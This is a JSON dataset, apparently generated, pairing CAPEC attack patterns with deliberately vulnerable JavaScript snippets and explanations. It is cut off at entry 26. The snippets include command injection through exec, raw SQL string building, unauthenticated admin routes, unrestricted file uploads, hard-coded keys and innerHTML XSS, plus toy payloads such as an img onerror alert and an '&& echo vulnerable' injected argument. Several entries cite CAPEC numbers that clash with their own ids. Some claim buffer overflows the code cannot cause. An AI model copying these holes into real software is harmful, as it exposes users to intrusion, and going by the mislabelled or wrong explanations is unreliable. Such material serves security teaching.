[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Middleware to check if user is authenticated\nfunction isAuthenticated(req, res, next) {\n  if (req.user) {\n    return next();\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n}\n\n// Route without proper ACL\napp.get('/admin', (req, res) => {\n  res.send('Welcome to the admin panel');\n});\n\n// Route with proper ACL\napp.get('/secure-admin', isAuthenticated, (req, res) => {\n  res.send('Welcome to the secure admin panel');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server. It demonstrates the main idea of CAPEC-122: 'Accessing Functionality Not Properly Constrained by ACLs'. The '/admin' route lacks proper access control, allowing any user to access it without authentication. This represents a vulnerability where an attacker can access functionality not properly constrained by ACLs. In contrast, the '/secure-admin' route uses a middleware function 'isAuthenticated' to check if the user is authenticated before granting access, representing a secure implementation. The code highlights the importance of proper access control to prevent unauthorized access to sensitive functionality."
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "const users = { 'user1': { password: 'password123', attempts: 0, locked: false } }; \n\nfunction login(username, password) { \n  if (users[username].locked) { \n    console.log('Account is locked.'); \n    return; \n  } \n  if (users[username].password === password) { \n    console.log('Login successful!'); \n    users[username].attempts = 0; \n  } else { \n    users[username].attempts += 1; \n    if (users[username].attempts >= 3) { \n      users[username].locked = true; \n      console.log('Account locked due to too many failed attempts.'); \n    } else { \n      console.log('Incorrect password.'); \n    } \n  } \n} \n\n// Simulating login attempts \nlogin('user1', 'wrongpassword'); \nlogin('user1', 'wrongpassword'); \nlogin('user1', 'wrongpassword'); \nlogin('user1', 'password123');",
        "description": "This JavaScript code snippet demonstrates a simple login mechanism with an account lockout feature. The `users` object stores user data, including the password, the number of failed login attempts, and the lockout status. The `login` function checks if the account is locked before proceeding. If the password is correct, it resets the attempt counter. If the password is incorrect, it increments the attempt counter and locks the account after three failed attempts. This code embodies the CAPEC idea of 'Inducing Account Lockout' by showing how an attacker could lock out a legitimate user by repeatedly entering incorrect passwords. The related CWEs are represented by the overly restrictive lockout mechanism (CWE-645) and the lack of measures to prevent excessive authentication attempts (CWE-307)."
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "function validateInput(input) {\n  // Early validation before canonicalization\n  if (!/^[a-zA-Z0-9]+$/.test(input)) {\n    throw new Error('Invalid input');\n  }\n  // Canonicalization step\n  input = input.replace(/^\\u200B+/, ''); // Remove leading zero-width space characters\n  // Further processing\n  console.log('Processed input:', input);\n}\n\ntry {\n  validateInput('\\u200B\\u200Badmin'); // Input with leading ghost characters\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where input validation is performed before canonicalization. The `validateInput` function first checks if the input contains only alphanumeric characters. However, it does this before removing leading zero-width space characters (ghost characters) in the canonicalization step. An attacker can exploit this by passing an input like '\\u200B\\u200Badmin', which bypasses the initial validation and gets processed as 'admin' after canonicalization. This embodies the main idea of CAPEC-Using Leading 'Ghost' Character Sequences to Bypass Input Filters and highlights related weaknesses such as improper input validation (CWE-20), incorrect behavior order (CWE-179, CWE-180), and improper handling of alternate encoding (CWE-173)."
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  const clientIP = req.connection.remoteAddress;\n  const allowedIP = '192.168.1.1';\n\n  if (clientIP === allowedIP) {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Access granted');\n  } else {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access denied');\n  }\n});\n\nserver.listen(8080, '127.0.0.1', () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that grants or denies access based on the client's IP address. The server checks if the client's IP address matches a hardcoded allowed IP address ('192.168.1.1'). If the IP matches, access is granted; otherwise, access is denied. This code embodies the main idea of CAPEC-273 (Using Alternative IP Address Encodings) by demonstrating a reliance on IP address for authentication (CWE-291). It is vulnerable because it does not account for alternative IP address encodings, which an attacker could exploit to bypass the access control. For example, an attacker could use different representations of the same IP address (e.g., octal, hexadecimal) to gain unauthorized access."
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Improper Verification of Source of a Communication Channel (CWE-940)\n    if (data.toString() === 'SUPERVISOR_TONE') {\n      // Improper Authorization (CWE-285)\n      socket.write('Access granted to administrative functions');\n    } else {\n      socket.write('Access denied');\n    }\n  });\n\n  // Improper Restriction of Communication Channel to Intended Endpoints (CWE-923)\n  socket.on('end', () => {\n    console.log('Disconnected from client');\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\nconsole.log('Server listening on port 1337');",
        "description": "This JavaScript code snippet creates a simple TCP server using the 'net' module. The server listens for incoming connections and processes data received from clients. The code demonstrates several vulnerabilities related to the CAPEC 'Blue Boxing' attack pattern and associated CWEs:\n\n1. **Improper Verification of Source of a Communication Channel (CWE-940)**: The server does not verify the origin of the incoming data, allowing any client to send data that could be interpreted as a supervisor signal.\n\n2. **Improper Authorization (CWE-285)**: The server grants access to administrative functions based solely on the content of the data ('SUPERVISOR_TONE'), without proper authorization checks.\n\n3. **Improper Restriction of Communication Channel to Intended Endpoints (CWE-923)**: The server does not ensure that it is communicating with the correct endpoint, making it vulnerable to unauthorized access.\n\nThis code represents the main idea of the 'Blue Boxing' attack, where an adversary can send a specific tone to gain unauthorized access to administrative functions due to weak authorization and verification mechanisms."
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "const http = require('http');\nconst { exec } = require('child_process');\n\nhttp.createServer((req, res) => {\n  const userInput = req.url.split('?')[1];\n  exec(`ls ${userInput}`, (error, stdout, stderr) => {\n    if (error) {\n      res.writeHead(500, { 'Content-Type': 'text/plain' });\n      res.end('Server Error');\n      return;\n    }\n    res.writeHead(200, { 'Content-Type': 'text/plain' });\n    res.end(stdout);\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It extracts user input from the URL query string and uses it directly in an OS command (`ls`). This is a classic example of OS Command Injection (CWE-78), where the input is not properly sanitized or validated, allowing an attacker to inject malicious commands. The code demonstrates the main idea of Argument Injection (CAPEC-137), where an attacker can change the behavior of the application by injecting data through non-validated arguments. The related CWEs provide additional context on the types of vulnerabilities that can arise from improper input handling, such as improper neutralization of special elements (CWE-74, CWE-146), incomplete disallowed input lists (CWE-184), and incorrect regular expressions or comparisons (CWE-185, CWE-697)."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nconst mysql = require('mysql');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'test_db'\n});\n\nconnection.connect();\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n\n  connection.query(query, (error, results) => {\n    if (error) {\n      res.send('An error occurred');\n    } else if (results.length > 0) {\n      res.send('Login successful');\n    } else {\n      res.send('Invalid credentials');\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of a login endpoint using Express.js and MySQL. The code takes user input for username and password, constructs an SQL query using string interpolation, and executes it against a MySQL database. This approach is vulnerable to Blind SQL Injection (CAPEC-111) because it does not properly neutralize special elements in the SQL command (CWE-89). The error messages are suppressed, but an attacker can still infer the success of their injection attempts based on the application's responses. This code also exemplifies improper input validation (CWE-20) and improper neutralization of special elements (CWE-74)."
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "const vulnerableLibrary = require('vulnerable-library');\n\nfunction processData(input) {\n  let buffer = Buffer.alloc(10); // Allocate a buffer of size 10\n  vulnerableLibrary.copyToBuffer(input, buffer); // Vulnerable API call\n}\n\n// Example usage\nlet userInput = 'A'.repeat(20); // User input larger than buffer size\nprocessData(userInput);",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability in an API call, aligning with the CAPEC description. The 'vulnerableLibrary' is a hypothetical library that contains a function 'copyToBuffer' which copies data to a buffer without checking the size of the input. The 'processData' function allocates a buffer of size 10 and then calls 'copyToBuffer' with user input. If the user input exceeds the buffer size, it leads to a buffer overflow. This example embodies CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer). The code highlights the risk of using vulnerable libraries and the broad impact it can have on software security."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction runCommand(userInput) {\n  let buffer = Buffer.alloc(10);\n  buffer.write(userInput, 'utf8');\n\n  exec(buffer.toString(), (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n}\n\n// Example usage\nrunCommand('A'.repeat(20));",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability in a command-line utility. The `runCommand` function takes user input, writes it to a buffer of fixed size (10 bytes), and then executes it as a command using `exec`. If the user input exceeds the buffer size, it can cause a buffer overflow, potentially leading to arbitrary code execution or privilege escalation. This snippet embodies the main idea of CAPEC-120, 'Buffer Overflow in Local Command-Line Utilities', and incorporates related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "const exec = require('child_process').exec;\n\n// Vulnerable function that uses an environment variable\nfunction runCommand() {\n  const userCommand = process.env.USER_COMMAND;\n  if (!userCommand) {\n    console.error('USER_COMMAND environment variable is not set');\n    return;\n  }\n\n  // CWE-20: Improper Input Validation\n  // CWE-120: Buffer Copy without Checking Size of Input\n  // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n  // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component\n  exec(userCommand, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n}\n\nrunCommand();",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that executes a command from an environment variable. The function `runCommand` retrieves the `USER_COMMAND` environment variable and executes it using the `exec` function from the `child_process` module. This code is vulnerable to several issues: \n\n1. **CWE-20 (Improper Input Validation)**: The code does not validate the content of the `USER_COMMAND` environment variable, allowing potentially malicious input.\n2. **CWE-120 (Buffer Copy without Checking Size of Input)** and **CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)**: Although JavaScript handles memory management, the underlying system calls made by `exec` can still be vulnerable to buffer overflow if the input is not properly sanitized.\n3. **CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component)**: The `exec` function can be exploited if special characters in the `USER_COMMAND` are not properly neutralized, leading to command injection.\n\nThis snippet embodies the main idea of CAPEC-14 (Buffer Overflow via Environment Variables) by showing how an attacker can manipulate an environment variable to cause a buffer overflow or other security issues."
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nhttp.createServer((req, res) => {\n  let filePath = path.join(__dirname, 'public', req.url);\n  let extname = path.extname(filePath).toLowerCase();\n  let contentType = 'text/html';\n\n  switch (extname) {\n    case '.js':\n      contentType = 'text/javascript';\n      break;\n    case '.css':\n      contentType = 'text/css';\n      break;\n    case '.json':\n      contentType = 'application/json';\n      break;\n    case '.png':\n      contentType = 'image/png';\n      break;\n    case '.jpg':\n      contentType = 'image/jpg';\n      break;\n    case '.wav':\n      contentType = 'audio/wav';\n      break;\n  }\n\n  fs.readFile(filePath, (error, content) => {\n    if (error) {\n      if (error.code == 'ENOENT') {\n        fs.readFile('./404.html', (error, content) => {\n          res.writeHead(200, { 'Content-Type': 'text/html' });\n          res.end(content, 'utf-8');\n        });\n      } else {\n        res.writeHead(500);\n        res.end('Sorry, check with the site admin for error: ' + error.code + ' ..\\n');\n        res.end();\n      }\n    } else {\n      res.writeHead(200, { 'Content-Type': contentType });\n      res.end(content, 'utf-8');\n    }\n  });\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server serves files based on their extensions to determine the content type. The main idea of the CAPEC is represented by the reliance on file extensions to determine the appropriate behavior, which can be exploited if an attacker uploads a file with a misleading extension. For example, a file with a '.jpg' extension might actually contain malicious JavaScript code. This code snippet embodies CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) and CWE-641 (Improper Restriction of Names for Files and Other Resources) by demonstrating how the server's behavior is determined by the file extension, potentially leading to misclassification and unexpected actions."
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "const multicastChannel = new MulticastChannel();\n\nfunction receiveMessage(message) {\n  // CWE-924: No integrity check on the received message\n  if (message.identifier === 'privilegedUser') {\n    // CWE-306: Missing authentication for critical function\n    performPrivilegedAction(message.data);\n  } else {\n    console.log('Message for regular user:', message.data);\n  }\n}\n\nfunction performPrivilegedAction(data) {\n  // CWE-201: Sensitive information is being logged\n  console.log('Performing privileged action with data:', data);\n}\n\nmulticastChannel.on('message', receiveMessage);",
        "description": "This JavaScript code snippet demonstrates a vulnerability where messages received via a multicast channel are processed without proper integrity checks (CWE-924). The function `receiveMessage` checks if the message identifier is 'privilegedUser' and performs a privileged action without any authentication (CWE-306). Additionally, sensitive information is logged during the privileged action (CWE-201). This code embodies the main idea of the CAPEC by showing how an attacker could choose a message identifier to gain access to privileged actions and sensitive information."
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Vulnerable environment variable\nconst configPath = process.env.CONFIG_PATH;\n\n// CWE-73: External Control of File Name or Path\nif (configPath) {\n  // CWE-20: Improper Input Validation\n  if (path.isAbsolute(configPath)) {\n    // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n    fs.readFile(configPath, 'utf8', (err, data) => {\n      if (err) {\n        console.error('Error reading config file:', err);\n        return;\n      }\n      console.log('Config data:', data);\n    });\n  } else {\n    console.error('Invalid config path');\n  }\n} else {\n  console.error('CONFIG_PATH environment variable is not set');\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an environment variable (CONFIG_PATH) is used to control the file path for reading a configuration file. The code checks if the CONFIG_PATH environment variable is set and if it is an absolute path. However, it does not properly validate the input beyond this, leading to potential CWE-73 (External Control of File Name or Path) and CWE-20 (Improper Input Validation) vulnerabilities. Additionally, if the file is read successfully, its contents are logged, which could expose sensitive information (CWE-200: Exposure of Sensitive Information to an Unauthorized Actor). This snippet embodies the main idea of CAPEC-14 (Subverting Environment Variable Values) by showing how an attacker could manipulate an environment variable to control the behavior of the software."
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  let buffer = Buffer.alloc(10);\n  let input = queryObject.input;\n\n  // CWE-20: Improper Input Validation\n  if (input) {\n    // CWE-120: Buffer Copy without Checking Size of Input\n    buffer.write(input, 'utf-8');\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.end('<html><body><h1>Buffer Content: ' + buffer.toString() + '</h1></body></html>');\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It parses the query parameters from the URL and writes the 'input' parameter to a buffer of fixed size (10 bytes) without checking the size of the input. This demonstrates a classic buffer overflow vulnerability (CWE-120) due to improper input validation (CWE-20). An attacker can exploit this by sending a specially crafted request with an 'input' parameter that exceeds the buffer size, potentially leading to a buffer overflow. The code represents the main idea of CAPEC-Client-side Injection-induced Buffer Overflow by showing how a client-side application (in this case, a server handling HTTP requests) can be vulnerable to buffer overflow attacks through improper handling of input data."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction executeCommand(userInput) {\n  // Vulnerable to command injection due to improper neutralization of special elements\n  const command = `ls ${userInput}`;\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Example usage\nexecuteCommand('&& echo vulnerable');",
        "description": "This JavaScript code snippet demonstrates a command injection vulnerability. The `executeCommand` function takes user input and concatenates it directly into a shell command without proper neutralization of special elements. This allows an attacker to inject additional commands using delimiters like '&&'. For example, passing '&& echo vulnerable' as user input will execute the 'ls' command followed by 'echo vulnerable', demonstrating how an attacker can exploit this vulnerability. This code embodies the main idea of CAPEC-146, highlighting the risks associated with improper neutralization of command delimiters and special elements."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "const users = { 'user1': 'password123', 'user2': 'qwerty', 'user3': 'letmein' }; // CWE-521: Weak Password Requirements\n\nfunction authenticate(username, password) {\n  if (users[username] && users[username] === password) {\n    return 'Access granted';\n  } else {\n    return 'Access denied';\n  }\n}\n\n// CWE-307: No restriction on excessive authentication attempts\nfor (let attempt = 0; attempt < 1000; attempt++) {\n  console.log(authenticate('user1', 'password123')); // Dictionary-based attack simulation\n}\n\n// CWE-308: Single-factor authentication\n// CWE-309: Password system for primary authentication\nconsole.log(authenticate('user2', 'qwerty'));",
        "description": "This JavaScript code snippet demonstrates a vulnerable authentication system that embodies the main idea of a Dictionary-based Password Attack (CAPEC-16). The code defines a set of users with weak passwords (CWE-521) and implements a simple authentication function that checks if the provided username and password match. The code then simulates a dictionary-based attack by attempting to authenticate a user multiple times without any restriction on the number of attempts (CWE-307). Additionally, the system relies solely on single-factor authentication (CWE-308) and uses passwords as the primary means of authentication (CWE-309), making it susceptible to such attacks."
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst fs = require('fs');\nconst app = express();\n\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.uploadedFile;\n  let uploadPath = __dirname + '/uploads/' + uploadedFile.name;\n\n  // Incorrect Permission Assignment for Critical Resource (CWE-732)\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) return res.status(500).send(err);\n\n    // Improper Authorization (CWE-285)\n    if (uploadedFile.mimetype !== 'application/x-executable') {\n      return res.status(403).send('Unauthorized file type.');\n    }\n\n    // Privilege Context Switching Error (CWE-270)\n    try {\n      fs.chmodSync(uploadPath, '0755');\n    } catch (err) {\n      return res.status(500).send('Failed to set file permissions.');\n    }\n\n    res.send('File uploaded and permissions set!');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that allows file uploads. The main idea of the CAPEC is represented by allowing an adversary to upload a file and potentially execute it. The code includes several CWE-related vulnerabilities:\n\n1. **Incorrect Permission Assignment for Critical Resource (CWE-732)**: The uploaded file is moved to a directory without proper validation of its permissions.\n2. **Improper Authorization (CWE-285)**: The code checks the file type but does not perform a thorough authorization check, allowing unauthorized file types to be uploaded.\n3. **Privilege Context Switching Error (CWE-270)**: The code attempts to set file permissions but does not handle privilege context switching securely.\n\nThis code demonstrates how improper handling of file uploads and permissions can lead to security vulnerabilities, aligning with the CAPEC description of using malicious files to exploit system configurations."
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "<html>\n<body>\n  <img src=\"x\" onerror=\"alert('XSS Attack!')\">\n  <!-- < !-CDATA-[<script>alert('XSS in CDATA!')</script>]] -->\n</body>\n</html>",
        "description": "This HTML snippet demonstrates a form of Cross-Site Scripting (XSS) targeting non-script elements, specifically an <img> tag and a comment section. The <img> tag includes an 'onerror' attribute that executes JavaScript code when the image fails to load, which is a common XSS vector. Additionally, a comment section contains a CDATA block with a script tag, which can be used to bypass certain input validation mechanisms. This example highlights vulnerabilities related to improper neutralization of script-related HTML tags (CWE-80), script in attributes of IMG tags (CWE-82), and incomplete denylist mechanisms (CWE-692)."
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "const userInput = '<script>alert(\"XSS Attack!\")</script>';\n\nfunction renderPage(content) {\n  document.body.innerHTML = content;\n}\n\n// Vulnerable to XSS\nrenderPage(userInput);",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an adversary can embed a malicious script within user input, which is then executed by the target software. The 'userInput' variable contains a script tag that triggers an alert, representing a Cross-site Scripting (XSS) attack (CWE-79). The 'renderPage' function directly inserts this input into the webpage's HTML without proper sanitization, allowing the embedded script to execute. This example highlights the CAPEC concept of 'Embedding Scripts within Scripts' and showcases the related CWE-79 vulnerability."
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "const crypto = require('crypto');\n\nconst algorithm = 'aes-256-cbc';\nconst key = '12345678901234567890123456789012'; // CWE-321: Hard-coded cryptographic key\nconst iv = Buffer.alloc(16, 0); // CWE-1204: Weak Initialization Vector (IV)\n\nconst encrypt = (text) => {\n  const cipher = crypto.createCipheriv(algorithm, Buffer.from(key), iv);\n  let encrypted = cipher.update(text);\n  encrypted = Buffer.concat([encrypted, cipher.final()]);\n  return encrypted.toString('hex');\n};\n\nconst decrypt = (encryptedText) => {\n  const encryptedTextBuffer = Buffer.from(encryptedText, 'hex');\n  const decipher = crypto.createDecipheriv(algorithm, Buffer.from(key), iv);\n  let decrypted = decipher.update(encryptedTextBuffer);\n  decrypted = Buffer.concat([decrypted, decipher.final()]);\n  return decrypted.toString();\n};\n\nconst plaintext = 'Sensitive data';\nconst encryptedText = encrypt(plaintext);\nconsole.log('Encrypted:', encryptedText);\nconsole.log('Decrypted:', decrypt(encryptedText));",
        "description": "This JavaScript code snippet demonstrates the encryption and decryption of sensitive data using the AES-256-CBC algorithm. The code contains several vulnerabilities that align with the CAPEC and related CWEs. Specifically, it uses a hard-coded cryptographic key (CWE-321), which makes it easier for an attacker to perform a brute force attack if the key is discovered. Additionally, the initialization vector (IV) is weak and predictable (CWE-1204), further compromising the encryption strength. These weaknesses make the encryption susceptible to brute force attacks, as described in the CAPEC."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\n// Simulated user database\nconst users = { 'user1': 'password1' };\n\n// Simulated session store\nlet sessions = {};\n\n// Login endpoint\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    const sessionId = Math.random().toString(36).substring(2);\n    sessions[sessionId] = username;\n    res.cookie('sessionId', sessionId, { httpOnly: true, secure: false }); // CWE-539: Persistent cookie with sensitive information\n    res.send('Logged in');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\n// Protected endpoint\napp.get('/protected', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  if (sessions[sessionId]) {\n    res.send(`Hello, ${sessions[sessionId]}`);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js application with a login mechanism and a protected endpoint. The login endpoint creates a session ID and stores it in a cookie, which is then used to authenticate the user for subsequent requests. The code embodies the main idea of CAPEC-139: Exploitation of Trusted Identifiers, as it relies on session IDs stored in cookies for authentication. The code also demonstrates several related CWEs: CWE-539 (Use of Persistent Cookies Containing Sensitive Information) by storing the session ID in a persistent cookie, CWE-290 (Authentication Bypass by Spoofing) by not validating the session ID securely, and CWE-384 (Session Fixation) by not invalidating existing session IDs upon login."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\n// Mock user data\nconst users = {\n  'user1': { password: 'password123', secret: 'Sensitive Data' }\n};\n\n// Vulnerable authentication endpoint\napp.post('/login', (req, res) => {\n  const username = req.query.username;\n  const password = req.query.password;\n\n  // Improper Authentication: No validation of input\n  if (users[username] && users[username].password === password) {\n    // Exposure of Sensitive Information to an Unauthorized Actor\n    res.send(`Welcome ${username}, here is your secret: ${users[username].secret}`);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(port, () => {\n  console.log(`Server running on http://localhost:${port}`);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable Express.js server that embodies the main idea of 'Exploiting Trust in Client'. The server has an endpoint '/login' that performs improper authentication by directly comparing user input without proper validation (CWE-287, CWE-20). If the username and password match, it exposes sensitive information (CWE-200) to the client. This setup can be exploited by an attacker who can spoof the client and gain unauthorized access to sensitive data. The code lacks proper input validation and protection mechanisms (CWE-693), making it susceptible to various attacks."
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst fs = require('fs');\nconst path = require('path');\n\nconst app = express();\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.file;\n  let uploadPath = path.join(__dirname, 'uploads', uploadedFile.name);\n\n  // Save the file without validating its type or content\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) return res.status(500).send(err);\n    res.send('File uploaded!');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple file upload server. The server allows users to upload files without validating the file type or content, which embodies the main idea of the CAPEC 'File Content Injection'. The code demonstrates several related CWEs: CWE-20 (Improper Input Validation) by not validating the uploaded file's properties, CWE-434 (Unrestricted Upload of File with Dangerous Type) by allowing any file type to be uploaded, and CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) by using the file's name and extension to save it without further checks. This lack of validation and unrestricted upload can lead to malicious files being processed and executed, representing a significant security vulnerability."
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "function processInput(input) {\n  var buffer = new Array(10);\n  for (var i = 0; i < input.length; i++) {\n    buffer[i] = input[i];\n  }\n  // Simulate a filter that fails to handle oversized input\n  if (input.length > buffer.length) {\n    console.log('Filter failed, input is too large');\n  }\n  return buffer.join('');\n}\n\n// Example usage\nvar userInput = 'A'.repeat(20); // Oversized input\nconsole.log(processInput(userInput));",
        "description": "This JavaScript code snippet demonstrates a filter failure through buffer overflow. The `processInput` function takes an input string and attempts to copy it into a fixed-size buffer of length 10. If the input length exceeds the buffer size, the filter fails, and an error message is logged. This code embodies the main idea of CAPEC-128 (Filter Failure through Buffer Overflow) by showing how an oversized input can overwhelm a filter, leading to potential security vulnerabilities. The related CWEs are represented by the lack of input size validation (CWE-20), the buffer overflow (CWE-120), and the improper restriction of operations within the bounds of a memory buffer (CWE-119)."
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
        "code_snippet": "const lockA = { locked: false };\nconst lockB = { locked: false };\n\nfunction acquireLock(lock) {\n  return new Promise((resolve) => {\n    (function waitForLock() {\n      if (!lock.locked) {\n        lock.locked = true;\n        resolve();\n      } else {\n        setTimeout(waitForLock, 10);\n      }\n    })();\n  });\n}\n\nasync function task1() {\n  await acquireLock(lockA);\n  console.log('Task 1 acquired lockA');\n  await new Promise(resolve => setTimeout(resolve, 50)); // Simulate work\n  await acquireLock(lockB);\n  console.log('Task 1 acquired lockB');\n  lockB.locked = false;\n  lockA.locked = false;\n}\n\nasync function task2() {\n  await acquireLock(lockB);\n  console.log('Task 2 acquired lockB');\n  await new Promise(resolve => setTimeout(resolve, 50)); // Simulate work\n  await acquireLock(lockA);\n  console.log('Task 2 acquired lockA');\n  lockA.locked = false;\n  lockB.locked = false;\n}\n\ntask1();\ntask2();",
        "description": "This JavaScript code snippet demonstrates a forced deadlock scenario. Two tasks, `task1` and `task2`, attempt to acquire two locks, `lockA` and `lockB`, in different orders. `task1` first acquires `lockA` and then tries to acquire `lockB`, while `task2` first acquires `lockB` and then tries to acquire `lockA`. If `task1` acquires `lockA` and `task2` acquires `lockB` before either can acquire the second lock, a deadlock occurs because each task is waiting for the other to release its lock. This example embodies the CAPEC concept of 'Forced Deadlock' and illustrates related CWEs such as 'Improper Synchronization' (CWE-662) and 'Deadlock' (CWE-833)."
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
